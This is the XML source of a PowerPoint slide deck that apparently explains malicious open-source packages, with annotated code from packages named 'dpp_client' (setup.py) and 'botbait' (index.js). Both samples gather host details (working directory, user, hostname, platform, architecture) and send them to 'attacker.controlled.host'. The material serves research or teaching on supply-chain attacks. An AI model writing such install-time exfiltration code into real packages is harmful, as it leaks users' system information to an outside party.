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2F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1507"/>
    <p:restoredTop sz="85755"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr>
        <p:scale>
          <a:sx n="223" d="100"/>
          <a:sy n="223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0A27C-FE9B-654D-85A4-98F92A04DAB2}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:t>2023/6/6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8EC31D-4B10-7D49-BF54-2E2C371A60E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34583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8EC31D-4B10-7D49-BF54-2E2C371A60ED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77033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685A8F-6036-499E-66E0-D48E53FEF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DFA3FB7-42C4-61DA-FD3F-7E7277948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FF7CFB-60EB-7716-D565-94445F1D2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2023/6/6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6A2C17-348C-214E-7939-8818126D1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671D81-B51D-BAC5-ED40-6F3EC5577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4799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0B230B-BFE9-8E62-903F-3E74A4154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EE4A3D-C392-4868-C286-34D626178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02BF7B-B180-9736-4998-B0264FA1B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2023/6/6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CB4E6C-F3FC-6FE4-5CE3-332F4655D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F9464A-4F93-49D0-A1AC-7ADEABF0F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3687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70961C-D35F-0D9F-7335-3117CEB3F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E74DF1-4514-FFB3-9B8F-6549D3A7E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A22E86-2F32-84DC-D148-88D9BF061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2023/6/6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E98E28-F491-E077-F853-AC001488E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9A8EFA-958C-F8A9-91CF-1C0F736EB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77094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8BE5F2-20FA-6E76-9CBA-47F9F2373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E9432E-47D0-1F7A-A21B-A0BCB6C011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1DC22D6-7F59-672D-681C-A44DD2638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DD431C-8FD7-79D7-3F2F-BCF1256E7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2023/6/6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83D8D5-1B56-5E4D-7855-A3C546798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28099F-02E4-389B-0C81-B794D4075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88882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4E4019-C830-859B-1636-20DED5739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7E5502-1975-B446-C8AE-5C6F9955E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8787B97-9801-2E39-53D4-454793FAD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119AAC8-E342-29BC-46AD-20C6C26C71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C8A2C8B-6113-C668-AFF4-B9EE18A16F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E87EF65-D8D7-FB6A-9ED3-67D1BD179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2023/6/6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43309D8-0DDE-88F4-80BD-179A0F5CF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098EFC0-324C-2225-8FFE-4A32F7E3A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6122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7E8D53-A398-2CE6-79C2-F8F1C83AA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8FC76EB-7F8B-AE2A-9095-EC3D99F42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2023/6/6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6251E04-31F1-3673-D7FC-98D5FB06F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0AF7CAE-EE03-8482-6F52-C264CED1F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2042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2FF9DF2-7982-683A-D080-66096FAFF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2023/6/6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541BA92-E931-36A7-FEA9-B555FD85B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AFEA54-9600-86CA-0721-54992FFD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8725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EB29E4-EF9B-73F8-3FBD-694A3DDF3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14FEF3-1592-B4E5-FA26-999C054F9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D5E987E-4F0C-3D4A-39DF-42B571D62C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2E71E6-3CE6-6881-BA45-1B26E4268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2023/6/6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47FE51-F0B3-9F49-B2DA-08D23D27D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5B2A09-3E7C-FEED-13C3-B8DE2DC9F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817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560A15-C2EA-2866-D935-B182C1534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E2859E9-BD9D-FD9A-F399-0D53D5D6C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3E2F26-86C4-5D23-52F7-EF23965A18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36B0465-5450-F084-A952-CDDEEC69C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2023/6/6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CFC89F-DF6F-932E-44AC-5D4E09783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DB96FF-ACD1-EB63-B1CE-65388C7A5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7414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18C5C0-C50A-8F3B-7A06-D0C39A324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ADA814B-5C2D-4224-804C-55905D846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B6ED36-7FD7-95F2-F998-EBD021AC7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2023/6/6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C7E325-513A-768D-96AE-7870E318B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D9977E-A455-F4A0-1F2A-AEDD8EA08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1669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D736346-A171-7660-DFBF-2C9C80F718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B220543-B313-C98A-9CBF-302FDE1E4E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3BCAC8-8862-6BF2-23E3-B2F6C8757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2023/6/6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6650DD-0485-DBC8-799D-25C3E64D3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805303-9FED-D42F-FB89-8AF726C01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2896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6923DC9-AB6E-7C26-B283-D70BFD8BF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753F39-A253-04E9-971F-8D5B9D48E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B465AA-3F22-CE30-7F3D-4234330DD8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C74B21-E513-2745-970B-E8B28C44A173}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" smtClean="0"/>
              <a:t>2023/6/6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B1621F-2555-893A-9F0C-7B3FC9B97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658B6B-7891-B73C-3053-D471366117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0207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169FF54-CA49-021C-1417-809AA89C2A66}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1290922" y="517766"/>
            <a:ext cx="3693571" cy="286232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" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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import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urllib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.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request</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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import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urllib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.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parse</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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import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os</a:t>
            </a:r>
            <a:b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</a:b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stream </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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=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os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.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popen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(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'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="032F62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pwd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'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)</a:t>
            </a:r>
          </a:p>
          <a:p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pwd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D73A49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=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stream.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read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()</a:t>
            </a:r>
            <a:b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</a:b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stream2 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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=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os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.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popen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(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'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="032F62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whoami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'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)</a:t>
            </a:r>
          </a:p>
          <a:p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who </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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=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 stream2.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6F42C1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read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()</a:t>
            </a:r>
            <a:b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</a:b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stream3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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=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os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.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popen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(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'hostname'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)</a:t>
            </a:r>
          </a:p>
          <a:p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h </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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=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 stream3.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="6F42C1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read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()</a:t>
            </a:r>
            <a:b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</a:b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long_description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D73A49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=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"test"</a:t>
            </a:r>
            <a:b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</a:b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params </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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=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urllib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.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parse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.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urlencode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({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'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="032F62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pwd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'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: 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pwd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, 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'who'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: who, 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'host'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: h})</a:t>
            </a:r>
            <a:b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</a:b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urllib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.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request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.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urlopen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(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"http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="032F62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attacker.controlled.host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/?"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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+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 params)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="B31D28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;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" i="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="B31D28"/>
              </a:solidFill>
              <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              <a:cs typeface="Courier New" panose="020703090202050204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4DC0BE6-AF04-D52C-EEDC-B469C7D7D6A2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6095999" y="517766"/>
            <a:ext cx="4616437" cy="323165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" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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var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6F42C1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http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D73A49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=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6F42C1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require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(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'http'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);</a:t>
            </a:r>
            <a:b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</a:br>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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var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 payload </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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=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 {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US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   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process_versions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: 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process.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="005CC5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versions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,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US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    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process_platform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: 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process.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="005CC5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platform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,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US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    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process_arch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: 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process.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="005CC5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arch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,</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US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    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type: 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process.argv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[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="005CC5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2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] </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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||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'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="032F62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index.js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'</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p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}</a:t>
            </a:r>
            <a:b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</a:br>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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var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 options </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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=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 {</a:t>
            </a:r>
          </a:p>
          <a:p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    hostname: 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'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="032F62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attacker.controlled.host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’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,</a:t>
            </a:r>
          </a:p>
          <a:p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    port: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="005CC5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1337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,</a:t>
            </a:r>
          </a:p>
          <a:p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    path: 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'/track'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,</a:t>
            </a:r>
          </a:p>
          <a:p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    method: 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'POST'</a:t>
            </a:r>
            <a:endParaRPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
              <a:solidFill>
                <a:srgbClr val="24292E"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p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};</a:t>
            </a:r>
            <a:b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</a:br>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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var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 req </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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=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http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.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request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(options, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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function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(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E36209"/>
                </a:solidFill>
                <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>res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){});</a:t>
            </a:r>
            <a:b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</a:b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req.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on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(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'error'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, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="D73A49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function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 () {});</a:t>
            </a:r>
            <a:b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</a:b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req.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write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(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" altLang="zh-CN" sz="1200" b="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="005CC5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JSON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.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stringify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(payload));</a:t>
            </a:r>
          </a:p>
          <a:p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req.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end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();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561F801-6032-4ACC-5A15-1CA16514E148}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="984925" y="3790220"/>
            <a:ext cx="40768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setup.py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zh-CN" alt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dpp_client-1.0.3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7CD424B-44D1-5A2B-945C-BC434DFECA77}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5771477" y="3764275"/>
            <a:ext cx="496567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index.js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zh-CN" alt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botbait-1.0.0</a:t>
            </a:r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9E6B9E34-A309-78DD-4B94-0E5E22FE5371}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1331681" y="1121890"/>
            <a:ext cx="2831531" cy="1086439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D4CCAAEF-A574-95F4-4DC0-F2E87C96873A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6154934" y="753035"/>
            <a:ext cx="3687566" cy="1086523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D717668A-3CB2-386E-219F-37077FC267C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1331681" y="2759408"/>
            <a:ext cx="3652812" cy="355071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B7EF9567-B638-7A57-9666-6FAE090B4C9D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6131082" y="2923802"/>
            <a:ext cx="4557501" cy="771154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3B1D49-0A99-6C77-25EC-09D74BD5A467}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5776454" y="531286"/>
            <a:ext cx="370614" cy="3231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2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3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4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5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6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7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8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9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10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11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12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13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14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15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16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17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8658BF-E92A-1A8A-2BEB-18CBFCFC48F8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="984926" y="517767"/>
            <a:ext cx="4076813" cy="327031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0C2B68-CF34-A67D-3907-E48A3F1C4F63}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="984927" y="531286"/>
            <a:ext cx="370614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2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3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4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5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6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7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8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9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10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11</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
              <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
            </a:endParaRP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12</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
              <a:latin typeface="Courier" pitchFamily="2" charset="0"/>
              <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49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41688E-DB32-847C-A3A0-07A1A2352AFE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5771477" y="492629"/>
            <a:ext cx="4965673" cy="327031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B130BD3E-4354-9E54-C702-841057369B50}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3666392" y="1000819"/>
            <a:ext cx="1774398" cy="393344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halkboard" panose="03050602040202020205" pitchFamily="66" charset="77"/>
              </a:rPr>
              <a:t>read sensitive information</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1200" dirty="0">
              <a:latin typeface="Chalkboard" panose="03050602040202020205" pitchFamily="66" charset="77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6B06E835-DCD2-ED5C-B42A-0EE0A514C57F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3976068" y="3383807"/>
            <a:ext cx="1606370" cy="333659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halkboard" panose="03050602040202020205" pitchFamily="66" charset="77"/>
              </a:rPr>
              <a:t>u</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-CN" sz="1200" dirty="0">
                <a:latin typeface="Chalkboard" panose="03050602040202020205" pitchFamily="66" charset="77"/>
              </a:rPr>
              <a:t>se network module call</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="49" name="Curved Connector 48">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{70E68B1A-8402-34D4-A75C-1EC16508874F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="45" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="3504698" y="3187233"/>
            <a:ext cx="471370" cy="363405"/>
          </a:xfrm>
          <a:prstGeom prst="curved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urved Connector 49">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0558BDEA-5501-3FD2-4AEC-B7EF9B5FC8DA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="45" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="5582438" y="3037110"/>
            <a:ext cx="572496" cy="513527"/>
          </a:xfrm>
          <a:prstGeom prst="curved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urved Connector 60">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FD9B0F97-3118-55F4-7264-B6E5CD228681}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:endCxn id="2" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000" flipV="1">
            <a:off x="4163212" y="1394162"/>
            <a:ext cx="376136" cy="270948"/>
          </a:xfrm>
          <a:prstGeom prst="curved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urved Connector 63">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{080314BD-118B-2EF1-3293-06E0C55C2834}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="44" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="5440790" y="1121890"/>
            <a:ext cx="706278" cy="75601"/>
          </a:xfrm>
          <a:prstGeom prst="curved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DBA4317-FE55-50C0-808A-CF9F4643DA4C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3720820" y="336790"/>
            <a:ext cx="1774398" cy="393344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halkboard" panose="03050602040202020205" pitchFamily="66" charset="77"/>
              </a:rPr>
              <a:t>import network module</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p: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D22E7DC8-F79C-CE9B-5AF7-860AAB917F79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5495218" y="533462"/>
            <a:ext cx="651850" cy="108795"/>
          </a:xfrm>
          <a:prstGeom prst="curved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DE3BD2EA-C180-6030-27EE-B662032810D9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="13" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000" flipV="1">
            <a:off x="3385458" y="533461"/>
            <a:ext cx="335363" cy="108795"/>
          </a:xfrm>
          <a:prstGeom prst="curved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圆角矩形 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F0772661-EFDD-A13B-8777-26E43F91C7B5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6154934" y="578773"/>
            <a:ext cx="2624793" cy="143928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圆角矩形 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C1BA29CA-3D74-E24F-C5EE-3F2F2865A8BB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1331681" y="578015"/>
            <a:ext cx="2000480" cy="361299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4521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849</TotalTime>
  <Words>276</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>54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等线</vt:lpstr>
      <vt:lpstr>等线 Light</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Chalkboard</vt:lpstr>
      <vt:lpstr>Courier</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Office 主题​​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峻安 张</dc:creator>
  <cp:lastModifiedBy>Kaifeng Huang</cp:lastModifiedBy>
  <cp:revision>100</cp:revision>
  <cp:lastPrinted>2023-04-10T03:38:56Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2023-04-10T02:45:49Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-06-06T07:10:02Z</dcterms:modified>
</cp:coreProperties>
</file>